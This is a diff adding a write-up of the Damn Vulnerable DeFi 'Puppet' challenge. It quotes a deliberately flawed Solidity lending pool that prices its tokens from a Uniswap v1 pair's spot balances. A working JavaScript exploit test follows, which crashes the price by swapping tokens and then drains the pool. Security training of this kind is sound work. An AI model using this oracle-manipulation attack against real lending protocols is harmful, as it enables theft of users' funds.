@@ -1,0 +1,110 @@
+#+AUTHOR: Francesco Cannarozzo
+* Puppet
+** Statement
+   A pool offers DVTs for loan, obtainable by depositing twice the token's value in eth as collateral,
+   supported by a Uniswap v1 exchange.
+
+   starting with 25 eth and 1000 DVTs, we are tasked to steal all 100000 DVTs from the pool.
+** Files
+*** PuppetPool.sol
+**** Code
+     #+BEGIN_SRC solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "../DamnValuableToken.sol";
+
+/**
+ * @title PuppetPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract PuppetPool is ReentrancyGuard {
+
+    using Address for address payable;
+
+    mapping(address => uint256) public deposits;
+    address public immutable uniswapPair;
+    DamnValuableToken public immutable token;
+    
+    event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);
+
+    constructor (address tokenAddress, address uniswapPairAddress) {
+        token = DamnValuableToken(tokenAddress);
+        uniswapPair = uniswapPairAddress;
+    }
+
+    // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH
+    function borrow(uint256 borrowAmount) public payable nonReentrant {
+        uint256 depositRequired = calculateDepositRequired(borrowAmount);
+        
+        require(msg.value >= depositRequired, "Not depositing enough collateral");
+        
+        if (msg.value > depositRequired) {
+            payable(msg.sender).sendValue(msg.value - depositRequired);
+        }
+
+        deposits[msg.sender] = deposits[msg.sender] + depositRequired;
+
+        // Fails if the pool doesn't have enough tokens in liquidity
+        require(token.transfer(msg.sender, borrowAmount), "Transfer failed");
+
+        emit Borrowed(msg.sender, depositRequired, borrowAmount);
+    }
+
+    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+        return amount * _computeOraclePrice() * 2 / 10 ** 18;
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+
+     /**
+     ... functions to deposit, redeem, repay, calculate interest, and so on ...
+     */
+
+}
+
+     #+END_SRC
+**** Breakdown
+***** State
+      the contract maintains references to public immutables /uniswapPair/, *address* of the corresponding pair,
+      and the usual *DamnValuableToken*.
+      Since the contract needs to accept and keep track of user deposits,
+      a *mapping* of addresses onto integers called /deposits/ is kept. 
+***** borrow
+      this function allows sender to borrow DVTs by depositing ether:
+      required deposit is calculated, and if the requirement for *msg.value* is met,
+      *msg.sender*'s /deposit/ entry is incremented, and tokens transferred.
+
+***** calculateDepositRequired
+      calculates deposit required for borrowing tokens as double their value in Ethers.
+
+***** _computeOraclePrice
+      Private function, called on by *calculateDepositRequired()* calculates token price as directly
+      proportional to the ratio between eths and dvts in the pair's balance.
+
+** Exploit
+   We might just be able to manipulate the market!
+   as we can see, as the pair's ETH balance falls to zero, so does the token price: 
+   thus, we can exploit the fact that we have much a lot more DVTs than the exchange initially has,
+   swap them for eth, and make the price fall to the ground: after that, we can just borrow as many tokens as we want.
+*** Code
+    #+BEGIN_SRC javascript
+      it('Exploit', async function () {
+        depositRequiredBefore = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+            1,
+            9999999999
+            )
+        depositRequiredAfter = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        expect(depositRequiredAfter).to.be.lt(depositRequiredBefore).and.to.be.lt(ATTACKER_INITIAL_TOKEN_BALANCE)
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: depositRequiredAfter})
+    });
+    #+END_SRC
+      
